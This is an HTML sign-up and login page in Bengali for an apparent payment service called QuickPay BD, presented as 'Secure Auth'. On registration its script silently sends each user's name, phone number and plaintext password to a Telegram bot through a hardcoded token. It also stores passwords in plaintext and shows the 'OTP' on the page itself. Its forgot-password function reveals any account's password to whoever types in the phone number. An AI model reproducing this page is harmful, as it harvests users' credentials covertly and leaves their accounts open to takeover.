<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickPay BD - Secure Auth</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root { --primary: #1e3799; --bg: #050a18; --neon: #00f2ff; }
        
        body { 
            background: var(--bg); 
            font-family: 'Poppins', sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden;
            color: white;
        }

        .auth-card { 
            background: rgba(255, 255, 255, 0.05); 
            width: 85%; 
            max-width: 400px; 
            padding: 35px 25px; 
            border-radius: 30px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center; 
            backdrop-filter: blur(15px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            transition: all 0.4s ease;
        }

        .logo i { 
            font-size: 50px; 
            color: var(--neon); 
            margin-bottom: 10px; 
            text-shadow: 0 0 15px var(--neon);
        }

        h2 { color: var(--neon); margin: 10px 0; font-size: 26px; letter-spacing: 1px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }

        .input-box { position: relative; margin-bottom: 15px; }
        .input-box i { position: absolute; left: 15px; top: 15px; color: var(--neon); }
        
        input { 
            width: 100%; 
            padding: 14px 14px 14px 45px; 
            border-radius: 12px; 
            border: 1px solid rgba(255,255,255,0.1); 
            background: rgba(0,0,0,0.3);
            color: white;
            font-size: 16px; 
            outline: none; 
            box-sizing: border-box; 
            transition: 0.3s;
        }

        input:focus { border-color: var(--neon); box-shadow: 0 0 10px var(--neon); }

        .otp-display { 
            background: #000; 
            border: 1px dashed var(--neon); 
            padding: 10px; 
            border-radius: 10px; 
            margin: 10px 0; 
            font-size: 24px; 
            font-weight: bold; 
            letter-spacing: 8px; 
            color: var(--neon);
            text-shadow: 0 0 10px var(--neon);
            display: none;
            animation: fadeIn 0.5s;
        }

        .btn { 
            width: 100%; 
            padding: 16px; 
            border-radius: 12px; 
            border: none; 
            background: linear-gradient(45deg, var(--primary), var(--neon)); 
            color: white; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px; 
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(0, 242, 255, 0.2);
        }

        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 242, 255, 0.4); }
        
        .forget-link { display: block; margin-top: 15px; font-size: 13px; color: #ff3131; cursor: pointer; }
        .toggle-text { margin-top: 25px; font-size: 14px; color: #aaa; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; }
        .toggle-link { color: var(--neon); font-weight: bold; cursor: pointer; text-decoration: underline; margin-left: 5px; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        #regFields { display: none; animation: fadeIn 0.4s ease; }
    </style>
</head>
<body onload="checkUserStatus()">

    <div class="auth-card">
        <div class="logo"><i class="fas fa-user-shield"></i></div>
        <h2 id="title">লগইন</h2>
        <p id="subTitle">আপনার তথ্য দিয়ে প্রবেশ করুন</p>

        <div class="input-box">
            <i class="fas fa-phone"></i>
            <input type="number" id="phone" placeholder="মোবাইল নম্বর">
        </div>

        <div id="regFields">
            <div class="input-box">
                <i class="fas fa-user"></i>
                <input type="text" id="name" placeholder="আপনার পুরো নাম">
            </div>
            <div id="otpBox" class="otp-display"></div>
            <div class="input-box">
                <i class="fas fa-shield-alt"></i>
                <input type="number" id="otpInput" placeholder="উপরের কোডটি লিখুন">
            </div>
        </div>

        <div class="input-box">
            <i class="fas fa-key"></i>
            <input type="password" id="password" placeholder="পাসওয়ার্ড দিন">
        </div>

        <button class="btn" id="mainBtn" onclick="handleAuth()">প্রবেশ করুন</button>
        <span class="forget-link" id="forgetBtn" onclick="forgetPassword()">পাসওয়ার্ড ভুলে গেছেন?</span>

        <div class="toggle-text">
            <span id="switchMsg">অ্যাকাউন্ট নেই?</span>
            <span class="toggle-link" id="switchBtn" onclick="toggleAuth()">রেজিস্ট্রেশন করুন</span>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://quickpaybd-8b8d0-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const botToken = "7725946897:AAHLBfX2k2fO6u_yW3165ZqFp2F-Ew_M57E";
        const chatId = "7414008169";

        let isLogin = true;
        let currentOTP = null;

        // নম্বর অটো-ফিল করার জন্য
        function checkUserStatus() {
            const savedPhone = localStorage.getItem("savedUser");
            if (savedPhone) { 
                document.getElementById('phone').value = savedPhone;
                // যদি নম্বর সেভ থাকে, তাহলে ইউজারকে সরাসরি পাসওয়ার্ড দিতে বলবে
                document.getElementById('subTitle').innerText = "নম্বর সেভ আছে, পাসওয়ার্ড দিয়ে লগইন করুন";
            }
        }

        function generateOTP() {
            currentOTP = Math.floor(1000 + Math.random() * 9000);
            const box = document.getElementById('otpBox');
            box.innerText = currentOTP;
            box.style.display = "block";
        }

        function toggleAuth() {
            isLogin = !isLogin;
            const regFields = document.getElementById('regFields');
            const title = document.getElementById('title');
            const subTitle = document.getElementById('subTitle');
            const mainBtn = document.getElementById('mainBtn');
            const switchMsg = document.getElementById('switchMsg');
            const switchBtn = document.getElementById('switchBtn');
            const forgetBtn = document.getElementById('forgetBtn');

            if (isLogin) {
                title.innerText = "লগইন";
                subTitle.innerText = "আপনার তথ্য দিয়ে প্রবেশ করুন";
                regFields.style.display = "none";
                mainBtn.innerText = "প্রবেশ করুন";
                switchMsg.innerText = "অ্যাকাউন্ট নেই?";
                switchBtn.innerText = "রেজিস্ট্রেশন করুন";
                forgetBtn.style.display = "block";
            } else {
                title.innerText = "রেজিস্ট্রেশন";
                subTitle.innerText = "নতুন অ্যাকাউন্ট তৈরি করুন";
                regFields.style.display = "block";
                mainBtn.innerText = "অ্যাকাউন্ট খুলুন";
                switchMsg.innerText = "অ্যাকাউন্ট আছে?";
                switchBtn.innerText = "লগইন করুন";
                forgetBtn.style.display = "none";
                generateOTP();
            }
        }

        function handleAuth() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;

            if (!phone || !password) return alert("সব তথ্য পূরণ করুন!");
            if (phone.length < 11) return alert("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন!");

            if (isLogin) {
                db.ref('users/' + phone).once('value', (s) => {
                    if (s.exists() && s.val().password === password) {
                        localStorage.setItem("savedUser", phone);
                        localStorage.setItem("isLoggedIn", "true");
                        window.location.replace("dashboard.html");
                    } else { alert("ভুল নম্বর বা পাসওয়ার্ড!"); }
                });
            } else {
                const name = document.getElementById('name').value;
                const otpVal = document.getElementById('otpInput').value;

                if (!name) return alert("নাম লিখুন!");
                if (otpVal != currentOTP) {
                    alert("ভুল ভেরিফিকেশন কোড!");
                    generateOTP(); 
                    return;
                }

                // ডুপ্লিকেট নম্বর চেক
                db.ref('users/' + phone).once('value', (s) => {
                    if (s.exists()) {
                        alert("এই নম্বরে অলরেডি অ্যাকাউন্ট আছে! লগইন করার চেষ্টা করুন।");
                        toggleAuth();
                    } else {
                        // ডাটা সেভ
                        db.ref('users/' + phone).set({ phone, name, password, balance: 0, time: Date.now() }).then(() => {
                            // ১. টেলিগ্রামে এসএমএস পাঠানো
                            const msg = `🚀 *নতুন রেজিস্ট্রেশন সফল!*\n━━━━━━━━━━━━━━━\n👤 নাম: ${name}\n📱 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}\n━━━━━━━━━━━━━━━`;
                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                            
                            // ২. লোকাল স্টোরেজে নম্বর সেভ রাখা
                            localStorage.setItem("savedUser", phone);
                            localStorage.setItem("isLoggedIn", "true");
                            
                            alert("অভিনন্দন! আপনার অ্যাকাউন্ট তৈরি হয়েছে।");
                            window.location.replace("dashboard.html");
                        });
                    }
                });
            }
        }

        function forgetPassword() {
            const phone = document.getElementById('phone').value;
            if (!phone) return alert("নম্বর লিখুন!");
            db.ref('users/' + phone).once('value', (s) => {
                if (s.exists()) alert("আপনার পাসওয়ার্ড হলো: " + s.val().password);
                else alert("অ্যাকাউন্ট পাওয়া যায়নি!");
            });
        }
    </script>
</body>
</html>
